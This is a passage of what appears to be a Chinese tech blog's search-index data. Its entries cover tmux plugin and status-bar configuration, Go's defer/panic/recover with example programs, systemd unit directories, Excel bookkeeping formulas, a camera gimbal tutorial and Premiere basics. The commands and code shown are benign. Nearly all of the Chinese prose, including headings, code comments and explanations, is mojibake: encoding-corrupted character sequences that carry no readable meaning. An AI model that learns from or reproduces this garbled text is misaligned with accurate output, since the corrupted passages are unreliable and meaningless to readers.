tmux-plugins/tpm             \\\n  '\nrun '~/.tmux/plugins/tpm/tpm'\n  ```\n  \n  å®‰è£…:\n  \n  ```bash\n  Installing plugins\n  1. Add new plugin to ~/.tmux.conf with set -g @plugin '...'\n  ```\n2. Press prefix + I (capital i, as in Install) to fetch the plugin.\n\nYou're good to go! The plugin was cloned to ~/.tmux/plugins/ dir and sourced.\n  ```\n\n+ tmux-resurrect ä¿å­˜session\n\n  ```bash\n  <prefix> ctrl + s #save\n  <prefix> ctrl + r #load\n  ```\n\n\n\n### 3.3 ä¿®æ”¹Oh My Tmux é…ç½®\n\n  ```bash\n  tmux_conf_new_window_retain_current_path=true  #windowä¿æŒè·¯å¾„\n  tmux_conf_new_pane_reconnect_ssh=true  #é‡æ–°è¿æ¥ ssh\n  tmux_conf_new_session_prompt=true  #æ–°å»º session è¾“å…¥åå­—\n\n  #å·¦è¾¹çŠ¶æ€æ ç²¾ç®€\n  tmux_conf_theme_status_left=' â #S '  \n  \n  # å³è¾¹æ˜¾ç¤ºå¤©æ°”, å’Œweek of year\n  tmux_conf_theme_status_right='#{prefix}#{pairing}#{synchronized} | #(ipconfig getifaddr en0) | week-#(date +%V)'\n  \n  # å‰ç¼€æ˜¾ç¤º emoji\n  tmux_conf_theme_prefix='ğŸ ğŸ ğŸŠ ğŸ‹ ğŸŒ ğŸ‰ '\n \n  # å¤åˆ¶æ¨¡å¼ vi\n  set -g mode-keys vi\n  \n  # çŠ¶æ€æ æ”¾åˆ°ä¸Šé¢\n  set -g status-position top\n\n------------------------------------------------------------------\n\n  # Ctrl+Shift+Left  windowå‘å·¦(ä¸éœ€è¦prefix), Ctrl+Shift+Left windowå‘å³(ä¸éœ€è¦prefix)\n  #bind-key -n C-S-Left swap-window -t -1 \n  #bind-key -n C-S-Right swap-window -t +1 \n  #é“¾æ¥: https://superuser.com/a/552493\n  bind-key -n C-S-Left swap-window -t -1\\; select-window -t -1\n  bind-key -n C-S-Right swap-window -t +1\\; select-window -t +1\n\n  # æ’ä»¶ç›¸å…³, å‚è€ƒ3.2å®‰è£…æ’ä»¶æ­¥éª¤\n  set -g status-right 'Continuum status: #{continuum_status}'\n  set -g @continuum-save-interval '10'\n  set -g @continuum-restore 'on'\n\n  set -g @tpm_plugins '    \\\n  tmux-plugins/tpm            \\\n  tmux-plugins/tmux-open \\\n  tmux-plugins/tmux-yank\t\\\n  tmux-plugins/tmux-sensible  \\\n  tmux-plugins/tmux-resurrect  \\\n  tmux-plugins/tmux-continuum  \\\n  '\n  run '~/.tmux/plugins/tpm/tpm'\n  ```\n\n  \n\n# 4. tmux é‡åˆ°çš„é—®é¢˜\n\n### 4.1 off, é¼ æ ‡æ— æ³•æ»šåŠ¨\n\nIn iTerm2 all you need to do is to go to \n\nPreferences > Profile > Terminal and check â€˜Save lines to scrollback when an app status bar is presentâ€™.\n\n### 4.2 on, é¼ æ ‡æ— æ³•æ™ºèƒ½é€‰ä¸­\n\nå¿«é€Ÿå…³é—­, prefix+m\n\n### 4.3 æ— è®ºoff, on  é¼ æ ‡ç‚¹å‡»æ–‡ä»¶ä¸æ˜¯é»˜è®¤ app æ‰“å¼€\n\nhttps://stackoverflow.com/a/56715244/7062454\n\nè‡ªå·±å¼ºç­”ä¸€é¢˜: å…ˆé€€å‡º tmux seesion, ç”¨é¼ æ ‡ç‚¹å‡»é€šè¿‡é»˜è®¤ app æ‰“å¼€, å†è¿›å…¥ tmux session å°±å¯ä»¥äº†\n\n### 4.4 é¼ æ ‡æ— æ³•æ»šåŠ¨\n\n+ é‡ç½®iterm2\n\n  åˆ é™¤appå, æ¸…ç†ä¸€ä¸‹é…ç½®\n\n  ```bash\n  rm ~/Library/Application\\ Support/iTerm2\n  rm ~/Library/Preferences/com.googlecode.iterm2.*\n  ```\n\n+ é‡ç½® oh my tmux\n\n  ```bash\n  #å‡ºé—®é¢˜, å¤§æ¦‚ç‡.tmux.conf.local\n  ```\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ http://louiszhai.github.io/2017/09/30/tmux/\n\n","tags":["iterm2"],"categories":["tmux"]},{"title":"golangçš„defer,panicå’Œrecover","url":"%2Fp%2Fc0441565.html","content":"\næ¯æ¬¡è¢« `defer`,`panic`å’Œ`recover` å‘çš„æ­»å»æ´»æ¥, ä»Šå¤©æœ‰æ—¶é—´æ¥æ•´ç†ä¸€ä¸‹.\n\n<!-- more -->\n\n# 1. defer\n\n### 1.1 åŒ¿åè¿”å›å€¼ä¸ä¼šä¿®æ”¹, æœ‰å ret æ–¹å¼æ‰ä¼šä¿®æ”¹\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tfmt.Println(\"a return:\", a())\n}\n\nfunc a() int {\n\tvar i int //deferæ”¹çš„è¿™ä¸ªå€¼,ä¸æ˜¯è¿”å›å€¼\n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"a defer2:\", i)\n\t}()\n  \n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"a defer1:\", i)\n\t}()\n  \n\treturn i\n}\n\n// æ‰“å°ç»“æœä¸º a defer1: 1\n// æ‰“å°ç»“æœä¸º a defer2: 2\n// æ‰“å°ç»“æœä¸º a return: 0\n//  a()int å‡½æ•°çš„è¿”å›å€¼æ²¡æœ‰è¢«æå‰å£°æ˜ï¼Œå…¶å€¼æ¥è‡ªäºå…¶ä»–å˜é‡çš„èµ‹å€¼ï¼Œè€Œdeferä¸­ä¿®æ”¹çš„ä¹Ÿæ˜¯å…¶ä»–å˜é‡ï¼ˆå…¶å®è¯¥deferæ ¹æœ¬æ— æ³•ç›´æ¥è®¿é—®åˆ°è¿”å›å€¼ï¼‰ï¼Œå› æ­¤å‡½æ•°é€€å‡ºæ—¶è¿”å›å€¼å¹¶æ²¡æœ‰è¢«ä¿®æ”¹ã€‚\n\n\n\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tfmt.Println(\"b return:\", b())\n}\n\nfunc b() (i int) {\n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"b defer2:\", i)\n\t}()\n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"b defer1:\", i)\n\t}()\n\treturn i // æˆ–è€…ç›´æ¥ return æ•ˆæœç›¸åŒ\n}\n\n// æ‰“å°ç»“æœä¸º b defer1: 1\n// æ‰“å°ç»“æœä¸º b defer2: 2\n// æ‰“å°ç»“æœä¸º b return: 2\n// b()(i int) å‡½æ•°çš„è¿”å›å€¼è¢«æå‰å£°æ˜ï¼Œè¿™ä½¿å¾—deferå¯ä»¥è®¿é—®è¯¥è¿”å›å€¼ï¼Œå› æ­¤åœ¨returnèµ‹å€¼è¿”å›å€¼ i ä¹‹åï¼Œdeferè°ƒç”¨è¿”å›å€¼ i å¹¶è¿›è¡Œäº†ä¿®æ”¹ï¼Œæœ€åè‡´ä½¿returnè°ƒç”¨RETé€€å‡ºå‡½æ•°åçš„è¿”å›å€¼æ‰ä¼šæ˜¯deferä¿®æ”¹è¿‡çš„å€¼ã€‚\n```\n\n\n\n### 1.2. defer æ¨è¿Ÿçš„æ˜¯å‡½æ•°ä½“æ‰§è¡Œ\n\ndeferå£°æ˜æ—¶ä¼šå…ˆè®¡ç®—ç¡®å®šå‚æ•°çš„å€¼ï¼Œdeferæ¨è¿Ÿæ‰§è¡Œçš„ä»…æ˜¯å…¶å‡½æ•°ä½“ã€‚\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tdefer P(time.Now())\n\ttime.Sleep(1e9) // 1s\n\tfmt.Println(\"1\", time.Now())\n}\nfunc P(t time.Time) {\n\tfmt.Println(\"2\", t) // æ­¤å¤„è¿˜æ˜¯è€çš„å€¼\n\tfmt.Println(\"3\", time.Now())\n}\n\n/*\n1 2020-06-30 20:27:58.893326 +0800 CST m=+1.000510368\n2 2020-06-30 20:27:57.892902 +0800 CST m=+0.000117140\n3 2020-06-30 20:27:58.89402 +0800 CST m=+1.001204598\n*/\n\n```\n\n\n\n### 1.3 å…ˆ defer å† panic, æœ€å panic æ”¶å°¸\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc calc(index string, a, b int) int {\n\tret := a + b\n\tfmt.Println(index, a, b, ret)\n\treturn ret\n}\n\nfunc main() {\n\ta := 1\n\tb := 2\n\tdefer calc(\"1\", a, calc(\"10\", a, b))\n\ta = 0\n\tdefer calc(\"2\", a, calc(\"20\", a, b))\n\tb = 1\n\tpanic(\"è§¦å‘å¼‚å¸¸\")\n}\n\n/*\n10 1 2 3\n20 0 2 2\n2 0 2 2\n1 1 3 4\npanic: è§¦å‘å¼‚å¸¸\n*/\n\n```\n\n\n\n### 1.4 è°ƒç”¨os.Exitä¸ä¼šæ‰§è¡Œdefer\n\nå½“å‘ç”Ÿpanicæ—¶ï¼Œæ‰€åœ¨goroutineçš„æ‰€æœ‰deferä¼šè¢«æ‰§è¡Œï¼Œä½†æ˜¯å½“è°ƒç”¨os.Exit()æ–¹æ³•é€€å‡ºç¨‹åºæ—¶ï¼Œdeferå¹¶ä¸ä¼šè¢«æ‰§è¡Œã€‚\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc deferExit() {\n\tdefer func() {\n\t\tfmt.Println(\"defer\")\n\t}()\n\tos.Exit(0)\n}\nfunc main() {\n\tdeferExit() // ä»€ä¹ˆä¹Ÿä¸è¾“å‡º\n}\n```\n\n\n\n### 1.5 returnå’Œ defer é¡ºåº\n\n+ å¤šä¸ªdeferçš„æ‰§è¡Œé¡ºåºä¸ºâ€œåè¿›å…ˆå‡ºâ€ã€‚\n\n+ æ‰€æœ‰å‡½æ•°åœ¨æ‰§è¡ŒRETè¿”å›æŒ‡ä»¤ä¹‹å‰ï¼Œéƒ½ä¼šå…ˆæ£€æŸ¥æ˜¯å¦å­˜åœ¨deferè¯­å¥ï¼Œè‹¥å­˜åœ¨åˆ™å…ˆé€†åºè°ƒç”¨deferè¯­å¥è¿›è¡Œæ”¶å°¾å·¥ä½œå†é€€å‡ºè¿”å›ã€‚\n\n+ returnå…¶å®åº”è¯¥åŒ…å«å‰åä¸¤ä¸ªæ­¥éª¤ï¼š\n\n  + ç¬¬ä¸€æ­¥æ˜¯ç»™è¿”å›å€¼èµ‹å€¼ï¼ˆè‹¥ä¸ºæœ‰åè¿”å›å€¼åˆ™ç›´æ¥èµ‹å€¼ï¼Œè‹¥ä¸ºåŒ¿åè¿”å›å€¼åˆ™å…ˆå£°æ˜å†èµ‹å€¼ï¼‰ã€‚\n\n  + ç¬¬äºŒæ­¥æ˜¯è°ƒç”¨RETè¿”å›æŒ‡ä»¤å¹¶ä¼ å…¥è¿”å›å€¼ï¼Œè€ŒRETåˆ™ä¼šæ£€æŸ¥deferæ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨å°±å…ˆé€†åºæ’æ’­deferè¯­å¥ï¼Œæœ€åRETæºå¸¦è¿”å›å€¼é€€å‡ºå‡½æ•°ã€‚\n\n  â€â€å› æ­¤ï¼Œâ€â€deferã€returnã€è¿”å›å€¼ä¸‰è€…çš„æ‰§è¡Œé¡ºåºåº”è¯¥æ˜¯ï¼šreturnæœ€å…ˆç»™è¿”å›å€¼èµ‹å€¼ï¼›æ¥ç€deferå¼€å§‹æ‰§è¡Œä¸€äº›æ”¶å°¾å·¥ä½œï¼›æœ€åRETæŒ‡ä»¤æºå¸¦è¿”å›å€¼é€€å‡ºå‡½æ•°ã€‚\n\n\n\n# 2. panic\n\n### 2.1 æˆªè· panic\n\n+ defer å’Œ recover é…åˆ, å¹¶ä¸”å…ˆå£°æ˜defer\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tdefer func() { // å¿…é¡»è¦å…ˆå£°æ˜deferï¼Œå¦åˆ™ä¸èƒ½æ•è·åˆ°panicå¼‚å¸¸\n\t\tfmt.Println(\"a\")\n\t\tif err := recover(); err != nil {\n\t\t\tfmt.Println(err)\n\t\t}\n\t\tfmt.Println(\"b\")\n\t}()\n\n\tpanic(\"å¼‚å¸¸ä¿¡æ¯\")\n\n\tfmt.Println(\"c\")\n}\n\n```\n\n\n\n### 2.2 panic ä¼ é€’\n\npanic ä¼šä¸€ç›´ä¼ é€’, å¯¼è‡´ä¸» gorouting å¥”æºƒ\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc testPanic2() {\n\tpanic(\"testPanic panic2\")\n}\n\nfunc testPanic1() {\n\tgo testPanic2()\n}\n\nfunc main() {\n\tfmt.Println(\"begin\")\n\tgo testPanic1()\n\tfor {\n\t\ttime.Sleep(time.Second)\n\t}\n}\n\n\n/*\nbegin\npanic: testPanic panic2\n\ngoroutine 5 [running]:\nmain.testPanic2()\n*/\n```\n\n\n\n# 3. recover\n\n### 3.1 æˆªè· panic åªèƒ½åœ¨ä¸€ä¸ªå±‚\n\nå¤–å±‚çš„ recover èƒ½æ•æ‰é‡Œå±‚çš„ panicå—?  ä¸èƒ½\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tdefer func() {\n\t\tif err := recover(); err != nil {\n\t\t\tfmt.Println(err)\n\t\t}\n\t}()\n\n\tgo func() {\n\t\tpanic(\"falut1\")\n\t}()\n\n\ttime.Sleep(time.Second)\n}\n\n/*\npanic: falut1\n\ngoroutine 18 [running]:\nmain.main.func2()\n        /Users/liuwei/golang/src/golangTest/suanfa/main.go:16 +0x39\ncreated by main.main\n        /Users/liuwei/golang/src/golangTest/suanfa/main.go:15 +0x71\nexit status 2\n*/\n```\n\n","tags":["golang"],"categories":["golang"]},{"title":"/etc/systemd/systemå’Œ/lib/systemd/systemçš„åŒºåˆ«","url":"%2Fp%2Fc1403091.html","content":"\n\n\n### 1. åŒºåˆ«\n\n##### 1.1 [/usr]/lib/systemd/system/  (è½¯ä»¶åŒ…å®‰è£…çš„å•å…ƒ)\n\nThe expectation is that `/lib/systemd/system` is a directory that should only contain systemd unit files which were put there by the package manager (YUM/DNF/RPM/APT/etc).\n\n##### 1.2 /etc/systemd/system/(ç³»ç»Ÿç®¡ç†å‘˜å®‰è£…çš„å•å…ƒ, ä¼˜å…ˆçº§æ›´é«˜)\n\nFiles in `/etc/systemd/system` are manually placed here by the operator of the system for ad-hoc software installations that are not in the form of a package. This would include tarball type software installations or home grown scripts.\n\n### 2. ä¼˜å…ˆçº§\n\nsystemdçš„ä½¿ç”¨å¤§å¹…æé«˜äº†ç³»ç»ŸæœåŠ¡çš„è¿è¡Œæ•ˆç‡, è€Œunitçš„æ–‡ä»¶ä½ç½®ä¸€èˆ¬ä¸»è¦æœ‰ä¸‰ä¸ªç›®å½•ï¼š\n\n```\n       Table 1.  Load path when running in system mode (--system).\n       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\n       â”‚Path                    â”‚ Description                 â”‚\n       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\n       â”‚/etc/systemd/system     â”‚ Local configuration         â”‚\n       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\n       â”‚/run/systemd/system     â”‚ Runtime units               â”‚\n       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\n       â”‚/lib/systemd/system     â”‚ Units of installed packages â”‚\n       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n<!-- more -->\n\nè¿™ä¸‰ä¸ªç›®å½•çš„é…ç½®æ–‡ä»¶ä¼˜å…ˆçº§ä¾æ¬¡ä»é«˜åˆ°ä½ï¼Œå¦‚æœåŒä¸€é€‰é¡¹ä¸‰ä¸ªåœ°æ–¹éƒ½é…ç½®äº†ï¼Œä¼˜å…ˆçº§é«˜çš„ä¼šè¦†ç›–ä¼˜å…ˆçº§ä½çš„ã€‚ \n\nç³»ç»Ÿå®‰è£…æ—¶ï¼Œé»˜è®¤ä¼šå°†unitæ–‡ä»¶æ”¾åœ¨`/lib/systemd/system`ç›®å½•ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦ä¿®æ”¹ç³»ç»Ÿé»˜è®¤çš„é…ç½®ï¼Œæ¯”å¦‚`nginx.service`ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼š\n\n1. åœ¨`/etc/systemd/system`ç›®å½•ä¸‹åˆ›å»º`nginx.service`æ–‡ä»¶ï¼Œé‡Œé¢å†™ä¸Šæˆ‘ä»¬è‡ªå·±çš„é…ç½®ã€‚\n2. åœ¨`/etc/systemd/system`ä¸‹é¢åˆ›å»º`nginx.service.d`ç›®å½•ï¼Œåœ¨è¿™ä¸ªç›®å½•é‡Œé¢æ–°å»ºä»»ä½•ä»¥.confç»“å°¾çš„æ–‡ä»¶ï¼Œç„¶åå†™å…¥æˆ‘ä»¬è‡ªå·±çš„é…ç½®ã€‚æ¨èè¿™ç§åšæ³•ã€‚\n\n`/run/systemd/system`è¿™ä¸ªç›®å½•ä¸€èˆ¬æ˜¯è¿›ç¨‹åœ¨è¿è¡Œæ—¶åŠ¨æ€åˆ›å»ºunitæ–‡ä»¶çš„ç›®å½•ï¼Œä¸€èˆ¬å¾ˆå°‘ä¿®æ”¹ï¼Œé™¤éæ˜¯ä¿®æ”¹ç¨‹åºè¿è¡Œæ—¶çš„ä¸€äº›å‚æ•°æ—¶ï¼Œå³Sessionçº§åˆ«çš„ï¼Œæ‰åœ¨è¿™é‡Œåšä¿®æ”¹ã€‚\n\n\n\nå‚è€ƒèµ„æ–™:\n\n+ https://unix.stackexchange.com/questions/206315/whats-the-difference-between-usr-lib-systemd-system-and-etc-systemd-system\n+ https://wiki.archlinux.org/index.php/Systemd","tags":["systemd"],"categories":["ç³»ç»Ÿ"]},{"title":"excelåˆ¶ä½œè®°è´¦æœ¬åŠŸèƒ½","url":"%2Fp%2F34a34835.html","content":"\næƒ³ç”¨excel å®ç°ä¸€ä¸ªç®€å•çš„è®°è´¦è¡¨ï¼Œå¦‚ä¸‹å›¾ï¼š\n\n![1](excelåˆ¶ä½œè®°è´¦æœ¬åŠŸèƒ½/1.png)\n\n<!-- more -->\n\n\n\n\n### 1. ç¬¬ä¸€è¡Œåˆ°å½“å‰è¡Œæ±‚å’Œ\n\n`=SUM(INDIRECT(\"A1:A\"&ROW()))`\n\n### 2. é™¤äº†ç¬¬ä¸€åˆ—é€‰ä¸­æ•´åˆ—\n\né€‰ä¸­æ•´åˆ—å°±æ˜¯åŒå‡»æ•´åˆ—\n\né™¤äº†ç¬¬ä¸€åˆ—ä¸é€‰, é‚£ä¹ˆåœ¨ç¬¬äºŒåˆ—, cmd+shift+â†“, å¦‚æœæœ‰æ•°æ®â†“æŒ‰ä¸¤æ¬¡\n\n### 3. å…¬å¼åº”ç”¨æ•´åˆ—\n\né€‰ä¸­æ•´åˆ— ctrl+d   åº”ç”¨æ‰€æœ‰æ ·å¼\n\n### 4. IF å‡½æ•°\n\n=IF(1>2,\"åˆ¤æ–­çœŸ\",\"åˆ¤æ–­å‡\")\n\n### 5. é™åˆ¶æ•°å­—\n\né€‰ä¸­åˆ—, å³é”®æ•°æ®éªŒè¯, å¼€å¯\n\n### 6. åˆ é™¤æ•°æ®, ä¸åˆ é™¤å…¬å¼\n\nè½¯ä»¶æ”¯æŒï¼Œåœ¨çº¿æ–‡æ¡£ä¸æ”¯æŒã€‚\n\n### 7. å¦‚æœå‰é¢æœ‰å€¼, åé¢è‡ªåŠ¨è®¡ç®—,  å¦åˆ™æ˜¾ç¤ºç©º\n\n+ æ€»é‡‘é¢\n\n   `=IF(ISBLANK(C4),\"\",SUM(INDIRECT(\"C4:C\"&ROW()))) `  // C4æ˜¯ç¬¬ä¸€ä¸ªæ•°æ®, å¯¹ä¸‹é¢çš„åˆ—åº”ç”¨æ ·å¼\n\n\n","tags":["excel"],"categories":["ä¸ªäººè®°å½•"]},{"title":"æ™ºäº‘äº‘é¹¤2_crane2æ•™ç¨‹","url":"%2Fp%2F3bad91c1.html","content":"\n\n\n### 1. å®‰è£…\n\n+ å®‰è£…ç”µæ± \n+ æ‹§ä¸Šä¸‰è„šæ¶\n\n### 2. å¹³è¡¡\n\nè°ƒèŠ‚å¹³è¡¡ä¹‹å‰éœ€è¦å…ˆè®¤æ¸…ä¸‰ä¸ªè½´:\n\n+ ä¿¯ä»°è½´   ç›¸æœºçš„å³ä¾§çš„é‚£ä¸ªåœ†åœˆ(è½¬åŠ¨æ”¹å˜è§’åº¦)\n\n+ æ¨ªæ»šè½´   åæ–¹å†™ç€æ™ºäº‘å­—ä½“çš„é‚£ä¸ªåœ†åœˆ(è²Œä¼¼ä¸ä¼šè½¬åŠ¨,å€¾æ–œæ”¹å˜è§’åº¦)\n\n+ èˆªå‘è½´   æ‰‹æŸ„ä¸Šæ–¹çš„é‚£ä¸ªåœ†åœˆ(è½¬åŠ¨æ”¹å˜è§’åº¦)\n\n  \n\n##### 2.1 è°ƒèŠ‚å¹³è¡¡\n\n+ å…ˆè°ƒèŠ‚ä¿¯ä»°è½´æ°´å¹³, å‰åç§»åŠ¨å¿«è£…æ¿, æ¾æ‰‹æ°´å¹³åæ‹§ç´§å¿«è£…æ¿èºä¸\n+ å†è°ƒèŠ‚ä¿¯ä»°è½´å‚ç›´, æ¾æ‰‹å‚ç›´åæ‹§ç´§ä¿¯ä»°è½´èºä¸\n+ å†è°ƒèŠ‚æ¨ªæ»šè½´, æ¾æ‰‹æ°´å¹³åæ‹§ç´§æ¨ªæ»šè½´èºä¸\n+ æœ€åè°ƒèŠ‚èˆªå‘è½´, æŠŠä¸‰è„šæ¶æ€¼ç€è‚šå­,æ¾æ‰‹æ°´å¹³åæ‹§ç´§èˆªå‘è½´èºä¸\n\n<!-- more -->\n\n### 3. APP\n\n+ ZY Play(å¯ä»¥æ§åˆ¶crane2)\n+ æ™ºäº‘æŒä¸ŠåŠ©æ‰‹ (è²Œä¼¼åªèƒ½çœ‹è§’åº¦)\n\n\n\n#### 4. SONY\n\n+ è¿æ¥ç›¸æœºçº¿, å…ˆå¼€ç¨³å®šå™¨, å†å¼€ç›¸æœº\n+ cameraä¿®æ”¹ç›¸æœºä¸º sony, false(ä¸ä¸ºç›¸æœºä¾›ç”µ, å¯¹ç»™ç›¸æœºå¤‡ç”µæ± )\n+ ç”µæºé”®å½•åƒ, ç¡®è®¤é”®æ‹ç…§\n+ è·Ÿç„¦ä¸æ”¯æŒ,å¯ä»¥ç”¨å¤–ç½®ä¼ºæœè·Ÿç„¦å™¨(æ²¡å•¥åµç”¨)\n\n\n\n### 5. æ¨¡å¼\n\n##### 5.1 PF å·¦å³è·Ÿéšæ¨¡å¼ (ä¸€ç›´ä¿æŒæ°´å¹³)===>éœ€è¦è‡ªå·±æ§åˆ¶å·¦å³è½¬\n\n+ ä¿¯ä»°å’Œæ¨ªæ»šé”å®š, æ°´å¹³æ–¹å‘éšç€æ‰‹æŸ„è½¬åŠ¨\n\n+ å‘ä¸Šå’Œå‘ä¸‹æ”¹å˜ä»°è§’\n\n##### 5.2 L å…¨é”å®šæ¨¡å¼ (ä¿æŒæ°´å¹³å’Œå‚ç›´)===>éœ€è¦è‡ªå·±æ§åˆ¶ä»»ä½•æ–¹å‘\n\n+ ä¸‰ä¸ªè½´éƒ½é”å®š\n\n+ å‘ä¸Šå’Œå‘ä¸‹æ”¹å˜ä»°è§’\n\n+ å‘å·¦å’Œå‘å³æ”¹å˜æœå‘\n\n##### 5.3 F å…¨è·Ÿéšæ¨¡å¼ (æ°´å¹³å’Œå‚ç›´éƒ½æ´»)===>æ§åˆ¶å¥½è‡ªå·±\n\n+ æ¨ªæ»šé”å®š\n+ ä¿¯ä»°å’Œæœå‘éšæ‰‹æŸ„è½¬åŠ¨\n+ å‘å·¦å’Œå‘å³æ”¹å˜æ¨ªæ»šè§’åº¦\n\n##### 5.4 POV ç¬¬ä¸€è§†è§’æ¨¡å¼(360åº¦æ— æ­»è§’)===>è‡ªå·±è½¬æ‰‹æŸ„å¯¹å‡†(éš¾åº¦é«˜)\n\n+ ä¸Šä¸‹ç”»åœˆæ—‹è½¬\n+ æ‰‹æŸ„é¡ºæ—¶é’ˆå’Œé€†æ—¶é’ˆè½¬åŠ¨\n+ å®šå™¨æ‰‹æŸ„é¡¶ç«¯ä½œå®šå‘ç‚¹ï¼Œæ‰‹æŸ„æœ«ç«¯ä½œè½¬å‘ç‚¹\n\n##### 5.5 V ä¸‰å›´æ¢¦å¢ƒæ¨¡å¼===>æ¡ç´§æ‰‹æŸ„,ç‚¹æŒ‰é’®ç¿»è½¬\n\n+ å‰è¿›/åé€€ä¸­æŒ‰é’®æ—‹è½¬\n+ å‘å·¦å’Œå‘å³æ—‹è½¬ç›¸æœº\n+ å³ä½¿ä¸‰ç»´æ¢¦å¢ƒçš„æ‹æ‘„æ•ˆæœæ˜¯ç”»é¢çš„é¡º/é€†æ—¶é’ˆæ—‹è½¬ï¼Œä½†å®é™…ç¨³å®šå™¨çš„è¿åŠ¨è½¨è¿¹å¹¶éæ˜¯æ¨ªæ»šè½´ï¼Œè€Œæ˜¯èˆªå‘è½´ ã€‚\n+ åœ¨æ‹æ‘„å‰éœ€æ³¨æ„è¿›è¡Œç›¸æœºè°ƒå¹³ï¼Œå°¤ä¸ºæ˜¯å®¹æ˜“è¢«å¿½ç•¥çš„èˆªå‘è½´è°ƒå¹³ï¼Œä»¥ä¾¿å‘æŒ¥ç¨³å®šå™¨çš„æœ€å¤§åŠŸç‡å®ç°å®Œç¾æ‹æ‘„ã€‚\n\n\n\n#### 6. é…ä»¶\n\n+ å¤–ç½®ä¼ºæœè·Ÿç„¦å™¨, å› ä¸ºsony ä¸æ”¯æŒè·Ÿç„¦, å¯ä»¥ç”¨ä½œç‰©ç†è·Ÿç„¦, å·²æŒ‚é—²é±¼\n+ é³ç”²ç›‘è§†å™¨, éœ€è¦å¦è´­ä¹°é…ä»¶(è›‡ç®¡æ€ªæ‰‹), å·²æŒ‚é—²é±¼","tags":["photo"],"categories":["æ‘„å½±"]},{"title":"prå…¥é—¨æ•™ç¨‹ç¬”è®°","url":"%2Fp%2Fe24658ca.html","content":"\n\n\n\n### 0. å®‰è£…\n\n+ windows\n\n+ mac\n\n### 1. åŸºç¡€æ“ä½œ\n\n##### 1.1 è½¯ä»¶\n\n+ æ–°å»ºé¡¹ç›®\n+ çª—å£->å·¥ä½œåŒº->é‡ç½®\n+ é¦–é€‰é¡¹->è‡ªåŠ¨ä¿å­˜\n\n<!-- more -->\n\n##### 1.2 å¯¼å…¥\n\n+ åŒå‡»\n+ å³é”®->å¯¼å…¥\n+ æ‹–åˆ°æ–‡ä»¶å¤¹->å¯¼å…¥(æå‰å½’ç±»å¥½æ–‡ä»¶å¤¹èµ„æº)\n\n##### 1.3 åºåˆ—\n\n+ æ‰‹åŠ¨æ–°å»ºåºåˆ—, å¦‚1080P 25fpsâ€¦.\n+ ç›´æ¥é€šè¿‡èµ„æºæ¥åˆ›å»ºåºåˆ—\n+ v1,v2,v3 è§†é¢‘æ®µ,  a1,a2,a3 éŸ³é¢‘æ®µ\n+ è§†é¢‘å¯ä»¥å¼€å…³å°çœ¼ç›å…³é—­, éŸ³é¢‘å¯ä»¥mé™éŸ³\n+ å¯ä»¥ä¸Šä¸‹æ¨æ‹‰, è°ƒæ•´åºåˆ—æ®µçš„å®½åº¦\n+ é€Ÿåº¦/\bæŒç»­æ—¶é—´ å¯åˆ¶ä½œå‡æ ¼é™æ ¼, åºåˆ—å‰é¢ä¼šå‡ºç°fxæ ‡è¯†, (æ‹æ‘„100ps, é™ä½åˆ°25ps)\n+ åºåˆ—å¯ä»¥æ‹–åŠ¨å¹¶å…¥ä¹‹å‰çš„ç³»åˆ—\n\n##### 1.4 æ“ä½œ\n\n+ Mæ ‡è®° -> å‰ªåˆ€è£å‰ª -> æ³¢çº¹åˆ é™¤ \n+ alt æŒ‰åºåˆ—æ®µ -> æ‹–åˆ° -> å¤åˆ¶\n\n##### 1.5 è½¬åœº\n\n+ æ•ˆæœ -> è§†é¢‘è¿‡æ¸¡ -> æ‹–åŠ¨ -> æ”¾åœ¨ä¸¤ä¸ªæ®µä¸­é—´\n+ å¸¸ç”¨çš„æ˜¯ äº¤å‰æº¶è§£\n\n##### 1.6 éŸ³æ•ˆ\n\n+ 